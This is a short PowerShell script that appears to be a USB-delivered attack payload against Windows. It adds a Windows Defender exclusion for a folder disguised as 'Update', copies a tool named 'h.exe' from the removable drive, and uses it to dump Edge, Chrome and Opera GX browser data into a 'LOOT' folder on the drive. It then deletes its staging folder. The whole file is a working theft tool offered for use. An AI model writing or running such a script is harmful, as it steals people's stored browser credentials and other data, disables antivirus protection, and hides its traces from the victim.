$d = (gwmi Win32_Volume -Filter "DriveType=2").DriveLetter
$safe = "C:\Windows\Temp\Update"

# Get the user (not Administrator)
$User = (Get-WmiObject -Class Win32_ComputerSystem).UserName.Split('\')[-1]
$Profile = "C:\Users\$User"

# Get admin SID ( no matter the name type )
if ([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).Groups -match 'S-1-5-32-544')) {
    Add-MpPreference -ExclusionPath $safe -ErrorAction SilentlyContinue
}

md $safe -Force
copy "$d\tools\h.exe" "$safe\h.exe"

# Create loot directory
md "$d\LOOT" -Force
cd "$d\LOOT"

& "$safe\h.exe" -b edge -f json --dir "$d\LOOT\Edge"

& "$safe\h.exe" -b chrome -f json --dir "$d\LOOT\Chrome"

& "$safe\h.exe" -b operagx -f json --dir "$d\LOOT\Opera"

rm $safe -Recurse -Force